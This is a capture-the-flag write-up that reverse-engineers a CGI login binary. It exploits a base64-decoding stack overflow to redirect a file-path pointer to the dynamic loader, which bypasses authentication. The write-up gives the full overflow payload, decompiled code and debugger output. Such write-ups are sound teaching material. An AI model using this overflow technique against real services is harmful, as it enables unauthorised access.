# identification

Here we are provided with a tarball containing the "code" of a portal we need to connect to. The code is in fact a python script using `http.server --cgi` and an ELF binary for the cgi.

```console
$ cat run.sh
#!/bin/sh
export FLAG=CS{foobar}
python3 -m http.server --cgi --bind 127.0.0.1
$ file cgi-bin/portal.cgi
cgi-bin/portal.cgi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aead4fc5b1de633c95bfc8076a8338c9f64c3125, for GNU/Linux 3.2.0, stripped
```

We can check the protections on it as well and see that here we have stack canaries and the stack itself will be marked as non-executable.

```console
$ checksec cgi-bin/portal.cgi
[*] 'portal.cgi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Let's analyze this binary!

# analysis

We can see that the `CONTENT_LENGTH` and `REQUEST_METHOD` are passed through environment variables and the request body is from `stdin` in the `main()` function at `0x401453`. We also identify a function that we will call `login()` at `0x40123f` with the following annotated HLIL representation after reversing it:

```c
0040123f  void* fsbase
0040123f  int64_t rax = *(fsbase + 0x28)
0040125a  int64_t rcx = 0x42
0040125f  int32_t is_invalid
0040125f  int32_t* rdi = &is_invalid
00401262  for (; rcx != 0; rcx = rcx - 1)
00401262      *rdi = 0
00401262      rdi = rdi + 8
00401265  is_invalid = 1
0040129a  void passed_creds
0040129a  __b64_pton(login64, &passed_creds, 0x100, &passed_creds)
004012c7  *(&passed_creds + strlen(&passed_creds)) = ':'
004012f1  void* rcx_2 = &passed_creds + strlen(&passed_creds)
00401307  __b64_pton(pwd64, rcx_2, 0x100, rcx_2)
0040131a  FILE* rax_6 = fopen(filename: "creds.txt", mode: data_402012)
00401326  uint64_t ret_value
00401326  if (rax_6 == 0)
00401334      ret_value = 0xffffffff
004013fb  else
004013fb      while (true)
00401403          void creds_file_line
00401403          if (fgets(buf: &creds_file_line, n: 0x100, fp: rax_6) == 0)
00401403              break
0040134c          size_t creds_file_len = strlen(&creds_file_line)
00401370          if (strchr(&creds_file_line, ':') != 0)
00401394              if (creds_file_len != 0 && *(&creds_file_line + (creds_file_len - 1)) == '\n')
004013a3                  *(&creds_file_line + (creds_file_len - 1)) = 0
004013d2              if (strcmp(&passed_creds, &creds_file_line) == 0)
004013d2                  is_invalid = 0
004013dc                  break
00401413      fclose(fp: rax_6)
00401418      ret_value = zx.q(is_invalid)
00401422  *(fsbase + 0x28)
00401433  if (rax == *(fsbase + 0x28))
00401433      return ret_value
0040142d  __stack_chk_fail()
0040142d  noreturn
```

We see that the login and password values are decoded from base64 at `0x0040129a` and `0x00401307` and that a buffer containing the login followed by an inserted `:` and the password is created at `0x004012f1`. Looking at this buffer's definition and the way the credentials to check is constructed we spot an overflow when `password` is decoded by `__b64_pton` and placed after `login`.

The credentials to check locally are read from `creds.txt` opened at `0x0040131a`. `fgets()` gets called to retrieve all the lines of this file to check them against the credentials from the request.

Even with this overflow it's not possible to get code execution here due to the fact that we have stack canaries and a non-executable stack... Looking at the code we can see that `is_invalid` is set to `1` at the beginning and only to `0` when the strings are similar. I thought about setting it to `0` using the overflow but unfortunately, it's _bellow_ the controlled buffer :(

```c
int32_t is_invalid  {Frame offset -228}
void creds_file_line  {Frame offset -224}
void passed_creds  {Frame offset -124}
int64_t file_path  {Frame offset -20}
```

Theoritically we could have an underflow if we can wrap bellow `&passed_creds` but this is not feasible due to the `CONTENT_LENGTH` being checked agsinst signed integers in `main()` and the stack canary that would get popped. The only value we could overwrite is the pointer to the filepath that's passed to `fopen()` but we won't know our stack buffer address to specify another file containing lines with `:` that we would know (example, file common to all distrib). Maybe using `argv[0]` could be an option to read the binary itself but we might not control its value if (likely) ASLR is set on the remote host.

Got stuck here for quite some time and left it aside. Explaining my ideas to @HomeSen he told me that I was on the good way and a string is available in the binary. Seems I dismissed my idea a bit too fast here and giving a second look at the strings we can see the libc path! Thanks Patrick!

```c
004002a8 /lib64/ld-linux-x86-64.so.2
[...]
```

The plan is now: exploit the overflow and overwrite the path pointer with `0x4002a8` to open `/lib64/ld-linux-x86-64.so.2` and provide a login and password that would be in it.

# exploitation

## finding the credentials

Relying on `strings` would be an dangerous here since the code is using `fgets()` which might not return the same values. As such, I coded a quick utility to list the strings in the library and grep'd the ones with a `:` in them.

```c
#include <stdlib.h>
#include <stdio.h>

int	main(void)
{
	FILE* 	handle = NULL;
	char	line[256];

	handle = fopen("/lib64/ld-linux-x86-64.so.2", "r");
	while (1)
	{
		if (fgets(line, 255, handle) == 0)
			break;
		printf("__%s__\n", line);
	}
	return 0;
}
```

```console
$ gcc check.c && ./a.out | grep :
[...]
__	Version information:
__prelink checking: %s
__relocation processing: %s%s
__calling init: %s
__calling preinit: %s
__calling fini: %s [%lu]
__conflict processing: %s
__runtime linker statistics:
__  total startup time in dynamic loader: %s cycles
__      number of relocations from cache: %lu
__        number of relative relocations: %lu
__WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.
__    entry: 0x%0*lx  phdr: 0x%0*lx  phnum:   %*u
__runtime linker statistics:
__           final number of relocations: %lu
__final number of relocations from cache: %lu
```

Let's settle for `  total startup time in dynamic loader` as login and ` %s cycles` as password.

## overflow

Remember that a colon will be put after `strlen(login)` and the string should be the same than in the library, meaning `  total startup time in dynamic loader: %s cycles` and we still have to overflow the buffer. But how then!?! Use the NULL bytes Luke! Since the password is extracted from `__b64_pton()`, we don't care about parsing stopping at `\x00` like in a `strcpy()` based overflow. The null bytes will be happily extracted to the stack by `__b64_pton` for us :)

Calculating the distance between the controled buffer, the length of our `login` value, we end up with the following padding to trigger the overflow and reach `filename`):

```python
>>> from base64 import b64encode as b64
>>> login = "  total startup time in dynamic loader"
>>> pwd = " %s cycles"+ 203*"\x00"+"\x00\x00\x00\x00\x00\x00\x00\xa8\x02\x40\x00\x00\x00\x00\x00"
>>> b64(str.encode(login))
b'ICB0b3RhbCBzdGFydHVwIHRpbWUgaW4gZHluYW1pYyBsb2FkZXI='
>>> b64(str.encode(pwd))
b'ICVzIGN5Y2xlcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMKoAkAAAAAAAA=='
```

To get the exact padding (late at night), I attached `gdb` to the python process started by `run.sh` and set a breakpoint at the call to `fopen()` and looked at `rdi` value like in the following:

```console
$ ps aux | grep python
[...]
$ gdb -p $pid
(gdb) set follow-fork-mode child
(gdb) b *0x40131a
Breakpoint 1 at 0x40131a
(gdb) c
Continuing.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00000000004002a8  →  "/lib64/ld-linux-x86-64.so.2"
$rbx   : 0x0
$rcx   : 0x3d
$rdx   : 0x00000000010fb014  →  0x0000002100000000
$rsp   : 0x00007ffe2160ef50  →  0x00000000010faee0  →  "ICVzIGN5Y2xlcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x00007ffe2160f190  →  0x00007ffe2160f600  →  0x00000000004016d0  →   endbr64
$rsi   : 0x0000000000402012  →  0x6f43000000000072 ("r"?)
$rdi   : 0x00000000004002a8  →  "/lib64/ld-linux-x86-64.so.2"
$rip   : 0x000000000040131a  →   call 0x401110 <fopen@plt>
$r8    : 0x00007f7cf3a7e3c0  →  0x0002000200020002
$r9    : 0x49
$r10   : 0x00007f7cf3b342f0  →  0x176f0f66c0ef0f66
$r11   : 0x00007f7cf3a6ba20  →  0xeff9c5fa8948f989
$r12   : 0x0000000000401140  →   endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe2160ef50│+0x0000: 0x00000000010faee0  →  "ICVzIGN5Y2xlcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $rsp
0x00007ffe2160ef58│+0x0008: 0x00000000010fad00  →  "ICB0b3RhbCBzdGFydHVwIHRpbWUgaW4gZHluYW1pYyBsb2FkZX[...]"
0x00007ffe2160ef60│+0x0010: 0x00007ffe2160efb0  →  0x0000000000000000
0x00007ffe2160ef68│+0x0018: 0x0000000000000005
0x00007ffe2160ef70│+0x0020: 0x0000000000000001
0x00007ffe2160ef78│+0x0028: 0x0000000000000000
0x00007ffe2160ef80│+0x0030: 0x0000000000000000
0x00007ffe2160ef88│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40130c                  mov    rax, QWORD PTR [rbp-0x18]
     0x401310                  lea    rsi, [rip+0xcfb]        # 0x402012
     0x401317                  mov    rdi, rax
●→   0x40131a                  call   0x401110 <fopen@plt>
   ↳    0x401110 <fopen@plt+0>    jmp    QWORD PTR [rip+0x2f72]        # 0x404088 <fopen@got.plt>
        0x401116 <fopen@plt+6>    push   0xe
        0x40111b <fopen@plt+11>   jmp    0x401020
        0x401120 <atoi@plt+0>     jmp    QWORD PTR [rip+0x2f6a]        # 0x404090 <atoi@got.plt>
        0x401126 <atoi@plt+6>     push   0xf
        0x40112b <atoi@plt+11>    jmp    0x401020
─────────────────────────────────────────────────────────────── arguments (guessed) ────
fopen@plt (
   $rdi = 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2",
   $rsi = 0x0000000000402012 → 0x6f43000000000072 ("r"?)
)
```

I then used `Burp` to intercept a standard query and use those values.

![Alt text](imgs/burp_flag.png?raw=true "Starting the bootloader in qemu")

Unfortunately I started the CTF a few days late and I couldn't get more time on it to get more challenges in. Will look at them offline if time permits. Looking to next year adversary.quest!
